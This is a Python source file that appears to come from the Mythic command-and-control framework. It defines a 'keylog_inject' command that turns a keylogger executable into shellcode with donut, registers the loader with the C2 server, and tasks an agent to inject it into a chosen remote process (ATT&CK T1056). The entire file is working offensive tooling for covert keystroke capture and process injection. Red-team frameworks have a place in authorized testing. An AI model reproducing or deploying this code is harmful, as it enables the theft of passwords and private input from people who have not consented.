import os
from mythic_payloadtype_container.MythicCommandBase import *
import json
from uuid import uuid4
from os import path
from sRDI import ShellcodeRDI
from mythic_payloadtype_container.MythicRPC import *
import base64

class KeylogInjectArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pid",
                cli_name="PID",
                display_name="PID",
                type=ParameterType.Number,
                description="Process ID to inject keylogger into."),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Invalid number of parameters passed.\n\tUsage: {}".format(KeylogInjectCommand.help_cmd))
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            self.add_arg("pid", self.command_line.strip(), ParameterType.Number)
        self.add_arg("pipe_name", str(uuid4()))


class KeylogInjectCommand(CommandBase):
    cmd = "keylog_inject"
    needs_admin = False
    help_cmd = "keylog_inject [pid]"
    description = "Start a keylogger in a remote process."
    version = 2
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = KeylogInjectArguments
    attackmapping = ["T1056"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        exePath = "/srv/KeylogInject.exe"
        if not path.exists(exePath):
            raise Exception("Could not find {}".format(exePath))
        donutPath = "/Mythic/agent_code/donut"
        if not path.exists(donutPath):
            raise Exception("Could not find {}".format(donutPath))
        command = "chmod 777 {}; chmod +x {}".format(donutPath, donutPath)
        proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr= asyncio.subprocess.PIPE)
        stdout, stderr = await proc.communicate()
        
        command = "{} -f 1 -p \"{}\" {}".format(donutPath, task.args.get_arg("pipe_name"), exePath)
        # need to go through one more step to turn our exe into shellcode
        proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                        stderr=asyncio.subprocess.PIPE, cwd="/tmp/")
        stdout, stderr = await proc.communicate()
        if os.path.exists("/tmp/loader.bin"):
            file_resp = await MythicRPC().execute(
                "create_file",
                task_id=task.id,
                file=base64.b64encode(open("/tmp/loader.bin", 'rb').read()).decode(),
                delete_after_fetch=True,
            )
            if file_resp.status == MythicStatus.Success:
                task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
            else:
                raise Exception("Failed to register keylog assembly: " + file_resp.error)
        else:
            raise Exception("Failed to find loader.bin")
        return task

    async def process_response(self, response: AgentResponse):
        pass
